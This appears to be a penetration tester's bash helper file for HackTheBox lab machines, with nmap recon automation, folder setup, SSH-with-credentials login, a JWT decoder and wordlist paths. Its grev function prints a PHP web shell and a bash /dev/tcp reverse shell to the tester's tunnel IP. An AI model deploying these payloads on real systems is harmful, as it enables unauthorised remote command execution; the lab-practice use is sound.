#!/bin/bash

alias gports="xmlstarlet sel -t -v '//port[state/@state=\"open\"]/@portid' -nl open | paste -s -d, -"

# Returns different types of reverse shells
function grev(){
	# Switch case for reverse shell type
	case $1 in
		"php")
			echo "<?php echo '<pre>' . shell_exec(\$_GET['cmd']) . '</pre>'; ?>";
			;;
		*)
			# Fallback to bash reverse shell
			echo "bash -c 'bash -i >& /dev/tcp/$(gtunip)/1233 0>&1'"
			;;
	esac
			
}

# Executes a recon on the target ip
function recon(){
	# Checks that $tip is setted
	if [[ -z $tip ]]; then
		echo "Target IP not setted";
		return 1;
	fi 	
	
	# Does initial scan
	sudo nmap -sS --min-rate 5000 -p- --open -n -Pn $tip -vvv -oX open && \

	# Does deeper scan
	sudo nmap -sCV -p$(gports) -Pn -oN details $tip -vvv;

	# Creates the initial writeup.md file
	writeup="# Ports";
	for port in $(gports | tr ',' '\n'); do
		item="**$port** -"
		item="$item *$(grep "$port/" details | awk '{print $(NF - 2)}')*"
		item="$item (v$(grep "$port/" details | awk '{print $(NF - 1)}'))"

		writeup="$writeup\n$item";
	done
	echo "$writeup" >> ../writeup.md;
}

# Creates a new folder for a hackthebox machine
function htbc() {
	#Variables
	machine_name="$1"
	machine_lowername="$(echo $1 | awk '{print tolower($0)}')"
	machine_ip="$2"

	#Creating machine directories
	mkdir "/home/js/hacking/hackthebox/machines/$machine_lowername"
	cd "$_" || exit;
	mkdir recon content exploit recon/wfuzz
	
	#Creating obsidian writeup and symlink
	touch writeup.md
	ln -s "$(pwd)/writeup.md" "/home/js/documents/obsidian/Hacking/Machines/HackTheBox - $machine_name.md"

	#Cd into recon and updating target ip
	cd recon || exit;
	upvar tip "$machine_ip";
	upvar starting_path "$(pwd)";
}

# Logs in by ssh to the target ip address using a credentials file (user:pass)
function sshcreds() {
  # Read the credentials from the file
  local creds_file="creds"
  local creds_line
  if [[ -f "$creds_file" ]]; then
    creds_line=$(head -n 1 "$creds_file")
  else
    echo "Credentials file not found."
    return 1
  fi

  # Extract the username and password from the credentials line
  local username=${creds_line%%:*}
  local password=${creds_line#*:}

  local ip=$1
  # Check if an IP address is provided
  if [[ -z $1 ]]; then
    echo "IP address not provided, using target ($tip)"
    local ip="$tip"
  fi

  # Form the SSH command
  shift
  local ssh_command="sshpass -p '$password' ssh -o StrictHostKeyChecking=no $username@$ip $@"

  # Execute the SSH command
  echo "Logging in to $username@$ip..."
  bash -c "$ssh_command";
}

decode_base64_url() {
  local len=$((${#1} % 4))
  local result="$1"
  if [ $len -eq 2 ]; then result="$1"'=='
  elif [ $len -eq 3 ]; then result="$1"'=' 
  fi
  echo "$result" | tr '_-' '/+' | openssl enc -d -base64
}

decode_jwt(){
   decode_base64_url $(echo -n $2 | cut -d "." -f $1) | jq .
}

# Decode JWT header
alias jwth="decode_jwt 1"

# Decode JWT Payload
alias jwtp="decode_jwt 2"

### Variables
export vhlist='/home/js/hacking/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt'
export dirlist='/home/js/hacking/wordlists/dirbuster/directory-list-2.3-medium.txt'
export rockyou='/home/js/hacking/wordlists/rockyou-utf-8.txt'
export userlist='/home/js/hacking/wordlists/SecLists/Usernames/xato-net-10-million-usernames-dup.txt'
export lfi_payloads='/home/js/hacking/wordlists/lfi_payloads.txt'
export lfi_files='/home/js/hacking/wordlists/lfi-files.txt'
export dotdotpwn='/home/js/hacking/wordlists/dotdotpwn.txt'
export secrets='/home/js/hacking/wordlists/jwt.secrets.list'
export nginx='/home/js/hacking/wordlists/nginx.txt'
export springboot='/home/js/hacking/wordlists/SecLists/Discovery/Web-Content/spring-boot.txt'
